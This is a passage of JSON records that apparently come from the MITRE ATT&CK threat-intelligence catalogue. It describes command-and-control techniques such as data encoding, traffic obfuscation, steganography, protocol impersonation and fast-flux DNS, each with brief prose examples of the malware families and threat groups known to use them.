ways, including:\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"", "id": "T1659", "examples": [{"id": "S1088", "name": "Disco", "description": "Disco has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware."}], "sub_techniques": []}, {"name": "Data Encoding", "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip.", "detailed_description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip.", "id": "T1132", "examples": [{"id": "S0128", "name": "BADNEWS", "description": "After encrypting C2 data, BADNEWS converts it into a hexadecimal representation and then encodes it into base64."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 obfuscates C2 traffic with an altered version of base64."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit sends the payload from the C2 server as an encoded URL parameter. "}, {"id": "S0699", "name": "Mythic", "description": "Mythic provides various transform functions to encode and/or randomize C2 data."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used encoded data in HTTP URLs for C2."}], "sub_techniques": [{"name": "Standard Encoding", "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.", "detailed_description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.", "id": "T1132.001", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "C2 traffic from ADVSTORESHELL is encrypted, then encoded with Base64 encoding."}, {"id": "G0073", "name": "APT19", "description": "An APT19 HTTP malware variant used Base64 to encode communications to the C2 server."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used base64 to encode command and control traffic."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth encodes data using Base64 before sending it to the C2 server. "}, {"id": "S0129", "name": "AutoIt backdoor", "description": "AutoIt backdoor has sent a C2 response that was base64-encoded."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has encoded data using certutil before exfiltration."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Some Backdoor.Oldrea samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS encodes C2 traffic with base64."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has encoded binary data with Base64 and ASCII."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has encoded its C2 traffic with Base64."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server."}, {"id": "S0014", "name": "BS2005", "description": "BS2005 uses Base64 encoding for communication in the message body of an HTTP request."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to base64 encode C2 server responses."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak encodes the message body of HTTP traffic with Base64."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used Base64 to encode C2 communications."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can send additional modules over C2 encoded with base64."}, {"id": "S0144", "name": "ChChes", "description": "ChChes can encode C2 data with a custom technique that utilizes Base64."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT obfuscates communications with the C2 server using Base64 encoding."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL C2 messages are Base64-encoded."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use Base64 to encode its C2 traffic."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman encodes data using hexadecimal representation before sending it to the C2 server."}, {"id": "S0187", "name": "Daserf", "description": "Daserf uses custom base64 encoding to obfuscate HTTP traffic."}, {"id": "S0354", "name": "Denis", "description": "Denis encodes the data sent to the server in Base64."}, {"id": "S0200", "name": "Dipsind", "description": "Dipsind encodes C2 traffic with base64."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can Base64 encode data sent to C2."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to base64 encode C2 communications."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has encoded C2 traffic in hexadecimal format."}, {"id": "S0081", "name": "Elise", "description": "Elise exfiltrates data using cookie values that are Base64-encoded."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used Google\u2019s Protobufs to serialize data sent to and from the C2 server. Additionally, Emotet has used Base64 to encode data before sending to the C2 server."}, {"id": "S0171", "name": "Felismus", "description": "Some Felismus samples use a custom method for C2 traffic that utilizes Base64."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has encoded bidirectional data communications between a target system and C2 server using Base64."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis can use Base64 to encode its C2 traffic."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has used Zlib to compress C2 communications data before encrypting it."}, {"id": "S1117", "name": "GLASSTOKEN", "description": "GLASSTOKEN has hexadecimal and Base64 encoded C2 content."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can retrieve a Base64 encoded stager from C2."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can base64 encode C2 replies."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used ASCII encoding for C2 traffic."}, {"id": "S0170", "name": "Helminth", "description": "For C2 over HTTP, Helminth encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS, Helminth converts ASCII characters into their hexadecimal values and sends the data in cleartext."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has utilized Zlib compression to obfuscate the communications payload. "}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests."}, {"id": "S0044", "name": "JHUHUGIT", "description": "A JHUHUGIT variant encodes C2 POST data base64."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar encodes communications to the C2 server in Base64."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can Base32 encode chunks of output files during exfiltration."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used a custom base64 key to encode stolen data before exfiltration."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has Base64-encoded the message body of a HTTP request sent to C2."}, {"id": "G0032", "name": "Lazarus Group", "description": "A Lazarus Group malware sample encodes data with base64."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can use Base64 encoding to obfuscate C2 commands."}, {"id": "S0409", "name": "Machete", "description": "Machete has used base64 encoding."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can encode data using Base64 prior to exfiltration."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka communication includes a client-created session cookie with base64-encoded information representing information from the victim system."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has the ability to use base16 encoded strings in C2."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type uses Base64 encoding for C2 traffic."}, {"id": "S0083", "name": "Misdat", "description": "Misdat network traffic is Base64-encoded plaintext."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can use Base64 to encode information sent to its C2."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has used basE91 encoding, along with encryption, for C2 communication."}, {"id": "S1047", "name": "Mori", "description": "Mori can use Base64 encoded JSON libraries used in C2."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used tools to encode C2 communications including Base64 encoding."}, {"id": "S0385", "name": "njRAT", "description": "njRAT uses Base64 encoding for C2 traffic."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has encoded C2 communications in Base64."}, {"id": "S0439", "name": "Okrum", "description": "Okrum has used base64 to encode C2 communication."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE encodes data in hexadecimal format over the C2 channel."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has used zlib to compress all data after 0x52 for the custom TCP C2 protocol."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork used Base64 to encode C2 traffic."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot uses base64 encoding in conjunction with symmetric encryption mechanisms to obfuscate command and control communications."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can encode C2 traffic with Base64."}, {"id": "S0124", "name": "Pisloader", "description": "Responses from the Pisloader C2 server are base32-encoded."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has the ability to encode C2 communications with base64 encoding."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS encoded C2 traffic with base64."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER can use base64 encoded C2 communications."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka encodes C2 traffic with Base64."}, {"id": "S1108", "name": "PULSECHECK", "description": "PULSECHECK can base-64 encode encrypted data sent through C2."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can Base64 encode system information sent to C2."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT encodes C2 communications with base64."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can base64 encode C2 communications."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has used base64 to encode its C2 traffic."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can communicate with the C2 via base32-encoded subdomains."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT uses Base64 to encode information sent to the C2 server."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin base64 encodes strings that are sent to the C2 over its DNS tunnel."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro uses ZLIB Compression to compresses data sent to the C2 server in the payload section network communication packet."}, {"id": "S0085", "name": "S-Type", "description": "S-Type uses Base64 encoding for C2 traffic."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used Base64 to encode its C2 communications."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can base64 encode data sent in C2 communications prior to its encryption."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can encode client ID data in 32 uppercase hex characters and transfer to the actor-controlled C2 server."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke C2 traffic is base64-encoded."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has used Base64 for encoded C2 traffic."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE can base64 encode all incoming and outgoing C2 messages."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has encoded its C2 traffic with Base64."}, {"id": "S0543", "name": "Spark", "description": "Spark has encoded communications with the C2 server with base64."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp encodes C&C communication using Base64. "}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has encoded its communications to C2 servers using Base64."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has the ability to hex-encode collected data from an infected host."}, {"id": "S1112", "name": "STEADYPULSE", "description": "STEADYPULSE can transmit URL encoded data over C2."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST used Base64 encoding in its C2 traffic."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has used Base64 to encode its C2 traffic."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used encoded ASCII text for initial C2 communications."}, {"id": "S0678", "name": "Torisma", "description": "Torisma has encoded C2 communications with Base64."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can Base64-encode C2 commands."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used base64 encoding to hide command strings delivered from the C2."}, {"id": "S0476", "name": "Valak", "description": "Valak has returned C2 data as encoded ASCII."}, {"id": "S1116", "name": "WARPWIRE", "description": "WARPWIRE can Base64 encode captured credentials with btoa() prior to sending to C2."}, {"id": "S0514", "name": "WellMess", "description": "WellMess has used Base64 encoding to uniquely identify communication to and from the C2."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE can Base64 encode process output sent to C2."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has used Base64 to encode its C2 traffic."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has used URL/Percent Encoding on data exfiltrated via HTTP POST requests."}]}, {"name": "Non-Standard Encoding", "description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request. ", "detailed_description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request. ", "id": "T1132.002", "examples": [{"id": "S0031", "name": "BACKSPACE", "description": "Newer variants of BACKSPACE will encode C2 communications with a custom system."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot encodes commands from the control server using a range of characters and gzip."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use a custom Base64 alphabet for encoding C2."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can use a custom binary scheme to encode messages with specific commands and parameters to be executed."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use a modified base32 encoding to encode data within the subdomain of C2 requests."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has used a non-standard encoding in DNS tunneling removing any = from the result of base64 encoding, and replacing / characters with -s and + characters with -p."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can encode C2 communications with a base64 algorithm using a custom alphabet."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can encode data with a NOT operation before sending the data to the control server."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can use a modified Base64 encoding mechanism to send data to and from the C2 server."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can communicate with the C2 via subdomains that utilize base64 with character substitutions."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has encoded data as readable Latin characters."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can use a custom hex byte swapping encoding scheme to obfuscate tasking traffic."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use a custom base62 and a de-facto base32 encoding that uses digits 0-9 and lowercase letters a-z in C2 communications."}]}]}, {"name": "Data Obfuscation", "description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.", "detailed_description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.", "id": "T1001", "examples": [{"id": "S1111", "name": "DarkGate", "description": "DarkGate will retrieved encrypted commands from its command and control server for follow-on actions such as cryptocurrency mining."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy may obfuscate portions of the initial C2 handshake."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING can send and receive zlib compressed data within POST requests."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can send compressed and obfuscated packets to C2."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used obfuscated VBScripts with randomly generated variable names and concatenated strings."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has the ability to modify headers and URL paths to hide malicious traffic in HTTP requests."}, {"id": "S0439", "name": "Okrum", "description": "Okrum leverages the HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors encrypted IP addresses used for \"Agent\" proxy hops with RC4."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can embed C2 responses in the source code of a fake Flickr webpage."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has hashed a string containing system information prior to exfiltration via POST requests."}, {"id": "S0682", "name": "TrailBlazer", "description": "TrailBlazer can masquerade its C2 traffic as legitimate Google Notifications HTTP requests."}], "sub_techniques": [{"name": "Junk Data", "description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.", "detailed_description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.", "id": "T1001.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear has used byte randomization to obscure its behavior."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has used decoy traffic to surround its malicious network traffic to avoid detection."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent  can pad C2 messages with random generated values."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can generate a sequence of dummy HTTP C2 requests to obscure traffic."}, {"id": "S1047", "name": "Mori", "description": "Mori has obfuscated the FML.dll with 200MB of junk data."}, {"id": "S0016", "name": "P2P ZeuS", "description": "P2P ZeuS added junk data to outgoing UDP packets to peer implants."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT can send randomly-generated data as part of its C2 communication."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD samples were found to be highly obfuscated with junk code."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST added junk bytes to its C2 over HTTP."}, {"id": "S0682", "name": "TrailBlazer", "description": "TrailBlazer has used random identifier strings to obscure its C2 operations and result codes."}, {"id": "S0647", "name": "Turian", "description": "Turian can insert pseudo-random characters into its network encryption setup."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can add extra characters in encoded strings to help mimic DNS legitimate requests."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can use junk data in the Base64 string for additional obfuscation."}]}, {"name": "Steganography", "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.", "detailed_description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.", "id": "T1001.002", "examples": [{"id": "G0001", "name": "Axiom", "description": "Axiom has used steganography to hide its C2 communications."}, {"id": "S0187", "name": "Daserf", "description": "Daserf can use steganography to hide malicious code downloaded to the victim."}, {"id": "S0038", "name": "Duqu", "description": "When the Duqu command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file."}, {"id": "S0037", "name": "HAMMERTOSS", "description": "HAMMERTOSS is controlled via commands that are appended to image files."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron is controlled via commands that are embedded into PDFs and JPGs using steganographic methods."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can parse IDAT chunks from .png files to look for zlib-compressed and AES encrypted C2 commands."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can receive C2 commands hidden in the structure of .jpg and .gif images."}, {"id": "C0023", "name": "Operation Ghost", "description": "During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&C servers."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can process steganographic images attached to email messages to send and receive C2 commands. RDAT can also embed additional messages within BMP images to communicate with the RDAT operator."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can encode binary data into a .PNG file for C2 communication."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography."}, {"id": "S0672", "name": "Zox", "description": "Zox has used the .PNG file format for C2 communications."}]}, {"name": "Protocol or Service Impersonation", "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.", "detailed_description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.\nAdversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.", "id": "T1001.003", "examples": [{"id": "S0245", "name": "BADCALL", "description": "BADCALL uses a FakeTLS method during C2."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot generates a false TLS handshake using a public certificate to disguise C2 network communications."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can leverage the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI."}, {"id": "S0076", "name": "FakeM", "description": "FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants of FakeM use modified SSL code for communications back to C2 servers, making SSL decryption ineffective."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL uses fake Transport Layer Security (TLS) to communicate with its C2 server."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING uses a cookie named DSID to mimic the name of a cookie used by Ivanti Connect Secure appliances for maintaining VPN sessions."}, {"id": "S0246", "name": "HARDRAIN", "description": "HARDRAIN uses FakeTLS to communicate with its C2 server."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used a FakeTLS session for C2 communications."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can mimic HTTP protocol with custom HTTP \"verbs\" HIDE, ZVVP, and NOP."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy uses custom SSL libraries to impersonate SSL in C2 traffic."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has the ability to mimic legitimate services with customized HTTP URL paths and headers to hide malicious traffic."}, {"id": "S0439", "name": "Okrum", "description": "Okrum leverages the HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST masqueraded its network traffic as the Orion Improvement Program (OIP) protocol."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE has used FakeTLS for session authentication."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use custom communication methodologies that ride over common  protocols including TCP, UDP, HTTP, SMTP, and DNS in order to blend with normal network traffic. "}]}]}, {"name": "Dynamic Resolution", "description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.", "detailed_description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.", "id": "T1568", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has used Dynamic DNS providers for their malware C2 infrastructure."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can be configured to use dynamic DNS."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used a dynamic DNS service for C2."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used DDNS for C2 communications."}, {"id": "C0026", "name": "C0026", "description": "During C0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has incorporated dynamic DNS domains in its infrastructure."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use dynamic DNS domain names in C2."}, {"id": "S0449", "name": "Maze", "description": "Maze has forged POST strings with a random choice from a list of possibilities including \"forum\", \"php\", \"view\", etc. while making connection with the C2, hindering detection efforts."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE can use HTTP to download resources that contain an IP address and port number pair to connect to for C2."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used dynamic DNS services for C2."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "For Operation Dust Storm, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure."}, {"id": "S0148", "name": "RTM", "description": "RTM has resolved Pony C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used dynamic DNS services for C2 infrastructure."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has connected to a signalization server that provides a URL and port, and then Tomiris sends a GET request to that URL to establish C2."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has used dynamic DNS services to set up C2."}], "sub_techniques": [{"name": "Fast Flux DNS", "description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.", "detailed_description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.", "id": "T1568.001", "examples": [{"id": "S1025", "name": "Amadey", "description": "Amadey has used fast flux DNS for its C2."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used fast flux DNS to mask their command and control channel behind rotating IP addresses."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT operators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses."}, {"id": "G0045", "name": "menuPass", "description": 